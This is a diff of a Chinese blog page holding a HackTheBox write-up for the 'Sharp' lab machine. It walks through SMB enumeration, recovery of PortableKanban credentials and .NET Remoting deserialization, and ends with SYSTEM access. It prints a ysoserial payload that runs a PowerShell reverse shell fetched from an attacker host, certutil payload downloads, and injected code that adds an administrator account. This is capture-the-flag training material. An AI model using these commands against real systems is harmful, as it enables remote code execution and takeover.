@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;303  10.10.10.219   端口扫描windows的一些常规端口： 123456789101112131415$ nmap -Pn -p- 10.10.10.219Host discovery disabled (-Pn). All addresses will be marked">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;303  10.10.10.219                                                                                                              端口扫描windows的一些常规端口：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sharp - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/01/13/Sharp-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;303  10.10.10.219   端口扫描windows的一些常规端口： 123456789101112131415$ nmap -Pn -p- 10.10.10.219Host discovery disabled (-Pn). All addresses will be marked">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;303  10.10.10.219                                                                                                              端口扫描windows的一些常规端口：">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011203.jpg">
@@ -140,7 +140,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -230,23 +230,51 @@
 </li>
 <li><h2 id="10-10-10-219"><a href="#10-10-10-219" class="headerlink" title="10.10.10.219"></a>10.10.10.219</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>windows的一些常规端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -Pn -p- 10.10.10.219</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 08:36 CST</span><br><span class="line">Nmap scan report for 10.10.10.219</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">8889/tcp open  ddi-tcp-2</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2734.15 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h1 id="SMB-enum"><a href="#SMB-enum" class="headerlink" title="SMB enum"></a>SMB enum</h1><p>smb发现一个kanban可读：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011202.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="kanban"><a href="#kanban" class="headerlink" title="kanban"></a>kanban</h2><p>kanban里面是一些文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以下载下来分析：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbget -R smb://10.10.10.219/kanban</span><br></pre></td></tr></table></figure>
 
 <h1 id="kanban-files"><a href="#kanban-files" class="headerlink" title="kanban files"></a>kanban files</h1><h2 id="passwords"><a href="#passwords" class="headerlink" title="passwords"></a>passwords</h2><p>可以用ack来搜索strings，比原生strings高效：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ack</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> -i忽略大小写</span></span><br><span class="line">ack -i "password"</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011204.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>整理得到的信息,密码加密的，加密方式可能是exe里定义的(其实就是des，可以自己解，也可以直接用exe功能得到明文)：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">ID: e8e29158d70d44b1a1ba4949d52790a0</span><br><span class="line">Encrypted Password: &quot;k+iUoOvQYG98PuhhRC7&#x2F;rg&#x3D;&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">Lars</span><br><span class="line">ID: 0628ae1de5234b81ae65c246dd2b4a21</span><br><span class="line">Encrypted Password: &quot;Ua3LyPFM175GN8D3+tqwLA&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure>
 
@@ -256,13 +284,41 @@
 <p>所以操作最好准备一台wndows虚拟机，Administrator权限</p>
 <p>(<strong>没装windows，后面会用一些wp里的图，主要是理解流程</strong>)</p>
 <h1 id="PortableKanban"><a href="#PortableKanban" class="headerlink" title="PortableKanban"></a>PortableKanban</h1><p>当运行exe，会有个弹框提示从pk3.bak文件恢复数据：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>直接尝试Administrator空密码登录失败</p>
 <h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>因为是从pk3.bak恢复数据，我们直接查看这个文件，就是json格式，如果我们把Administrator的EncryptedPassword修改为空，我们就能够以空密码登录Administrator：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011206.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Lars-password"><a href="#Lars-password" class="headerlink" title="Lars password"></a>Lars password</h2><p>根据前面的文档，Setup/Users tab隐藏了用户的密码，去对应的tab取消hide，得到另一个用户Lars的明文密码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011208.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lars : G123HHrth234gRG</span><br></pre></td></tr></table></figure>
 
 <h2 id="Administrator-password"><a href="#Administrator-password" class="headerlink" title="Administrator password"></a>Administrator password</h2><p>配置文件里也有用户角色定义，那可以直接复制一份新的，把Lars修改成Admin，登录进去得到Administrator明文密码：</p>
@@ -274,21 +330,49 @@
 <p>得到新的有效账户是lars用的administrator密码组合：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011209.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p> 使用心得账号密码访问smb，多出来一个dev：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011210.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h2><p>dev也同样下载下来分析：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011211.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="dev-exe"><a href="#dev-exe" class="headerlink" title="dev exe"></a>dev exe</h1><p>根据notes或者简单的分析，exe是.net的，那就直接反编译康康：</p>
 <ul>
 <li><a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener">https://github.com/dnSpy/dnSpy</a></li>
 </ul>
 <h2 id="client-exe"><a href="#client-exe" class="headerlink" title="client.exe"></a>client.exe</h2><p>RemotingSample里有debug账号密码，8888端口前面也能看到是开放的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011212.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug : SharpApplicationDebugUserPassword123!</span><br></pre></td></tr></table></figure>
 
 <h1 id="ExploitRemotingService"><a href="#ExploitRemotingService" class="headerlink" title="ExploitRemotingService"></a>ExploitRemotingService</h1><p>根据相关信息，搜索发现相关漏洞利用，建议使用编译好的exe，自己编译坑太多了：</p>
@@ -305,31 +389,103 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># add to ps1 file</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 4445</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 7777</span><br><span class="line">rlwrap nc -lvvp 4445</span><br><span class="line"></span><br><span class="line">ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c &quot;powershell -c IEX(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;InvokePowerShellTcp.ps1&#39;)&quot;</span><br><span class="line"></span><br><span class="line">ExploitRemotingService.exe -s --user&#x3D;debug --pass&#x3D;&quot;SharpApplicationDebugUserPassword123!&quot; tcp:&#x2F;&#x2F;10.10.10.219:8888&#x2F;SecretSharpDebugApplicationEndpoint raw [payload]</span><br></pre></td></tr></table></figure>
 
 <p>有报错没什么影响，可以看到注入的powershell执行了，我们收到有http请求：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011213.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011214.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011213.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011214.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="lars-shell-amp-amp-user-flag"><a href="#lars-shell-amp-amp-user-flag" class="headerlink" title="lars shell &amp;&amp; user flag"></a>lars shell &amp;&amp; user flag</h1><p>反序列化打到lars用户的reverse shell，读取user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011215.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011215.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="WCF"><a href="#WCF" class="headerlink" title="WCF"></a>WCF</h1><p>lars用户Documents里有个wcf目录:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>因为我们能够访问dev目录，可以把wcf压缩后移到dev然后下载：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip</span><br><span class="line">move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</span><br></pre></td></tr></table></figure>
 
 <h2 id="wcf-project"><a href="#wcf-project" class="headerlink" title="wcf project"></a>wcf project</h2><p>wcf应该也是个VS项目，可以用VS打开slh文件查看代码逻辑(没装VS，用wp的图了，后面还是要装VS。。。):</p>
 <p>可以看到 Client  main里还定义了一个8889端口,这个可能是特权用户运行的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="modify-amp-amp-build"><a href="#modify-amp-amp-build" class="headerlink" title="modify &amp;&amp; build"></a>modify &amp;&amp; build</h2><p>后续利用还是要自己windows机器做，VS里添加恶意代码，build会生成新的WcfRemotingLibrary.dll和WcfClient.exe，然后传上去替换：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Console.WriteLine(client.InvokePowerShell(&quot; iex (new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;InvokePowerShellTcp.ps1&#39;)&quot;));</span><br><span class="line"></span><br><span class="line"># 也可以直接添加用户，然后evil-winrm连接(测试添加用户成功但连不上，不知道什么原因)</span><br><span class="line">Console.WriteLine(client.InvokePowerShell(@&quot;net user miao miao123456 &#x2F;ADD&quot;));</span><br><span class="line">Console.WriteLine(client.InvokePowerShell(@&quot;net localgroup Administrators miao&quot;));</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011303.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>添加用户成功但连接提示认证问题，可能是密码复杂度问题，还是常规reverse shell吧：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="文件传输-1"><a href="#文件传输-1" class="headerlink" title="文件传输"></a>文件传输</h2><p>然后就是把生成的新文件传回去：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">"http://10.10.14.10:7777/WcfRemotingLibrary.dll"</span> WcfRemotingLibrary.dll</span><br><span class="line">certutil -urlcache -split -f <span class="string">"http://10.10.14.10:7777/WcfClient.exe"</span> WcfClient.exe</span><br></pre></td></tr></table></figure>
 
 <h1 id="exploit-amp-amp-root-flag"><a href="#exploit-amp-amp-root-flag" class="headerlink" title="exploit &amp;&amp; root flag"></a>exploit &amp;&amp; root flag</h1><p>然后直接运行传上去的WcfClient.exe，里面的恶意代码会以特权用户执行，得到system shell，读取root.txt(这个打到的shell很容易断，需要快速操作，或者直接在这个shell的基础上再加载一个shell比较稳定):</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011306.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener">https://github.com/dnSpy/dnSpy</a></li>
 <li>tyranid/ExploitRemotingService: A tool to exploit .NET Remoting Services<br><a href="https://github.com/tyranid/ExploitRemotingService" target="_blank" rel="noopener">https://github.com/tyranid/ExploitRemotingService</a></li>
